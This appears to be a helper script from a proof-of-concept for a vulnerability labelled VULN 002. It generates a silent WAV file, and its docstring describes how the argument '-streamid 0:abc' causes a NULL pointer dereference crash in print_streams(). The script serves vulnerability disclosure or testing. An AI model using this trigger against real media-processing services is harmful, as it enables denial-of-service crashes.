#!/usr/bin/env python3
"""
vuln_002_gen.py - Generate a minimal valid WAV input file for VULN 002 PoC.

The vulnerability is a NULL pointer dereference in print_streams() at graphprint.c:782.
The trigger: -streamid 0:abc causes new_output_stream() to return AVERROR(EINVAL)
AFTER mux_stream_alloc() increments of->nb_streams but BEFORE ost->st is set.
During cleanup, print_filtergraphs() -> print_streams() then dereferences ost->st
(which is NULL) without any NULL check.

This script creates a minimal valid WAV file using only Python struct/bytes.
"""

import struct
import os

OUTPUT_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln_002_input.wav")


def create_minimal_wav(filename):
    """
    Construct a minimal valid RIFF/WAV audio file with PCM audio.
    WAV format:
        RIFF <file_size> WAVE
            fmt  <16>  <PCM format fields>
            data <data_size> <samples>
    """
    # PCM audio parameters
    audio_format    = 1       # PCM = 1
    num_channels    = 1       # mono
    sample_rate     = 8000    # 8 kHz
    bits_per_sample = 16
    num_samples     = 8000    # 1 second of silence

    block_align = num_channels * (bits_per_sample // 8)  # 2
    byte_rate   = sample_rate * block_align              # 16000

    # fmt chunk body (16 bytes for PCM)
    fmt_body = struct.pack('<HHIIHH',
        audio_format,
        num_channels,
        sample_rate,
        byte_rate,
        block_align,
        bits_per_sample,
    )

    # audio data: silence (all zeros)
    audio_data = bytes(num_samples * block_align)

    # Assemble chunks
    fmt_chunk  = b'fmt ' + struct.pack('<I', len(fmt_body)) + fmt_body
    data_chunk = b'data' + struct.pack('<I', len(audio_data)) + audio_data

    # RIFF container
    riff_body = b'WAVE' + fmt_chunk + data_chunk
    wav_bytes  = b'RIFF' + struct.pack('<I', len(riff_body)) + riff_body

    with open(filename, 'wb') as f:
        f.write(wav_bytes)

    print(f"[vuln_002_gen] Created {filename} ({len(wav_bytes)} bytes)")


if __name__ == '__main__':
    create_minimal_wav(OUTPUT_FILE)
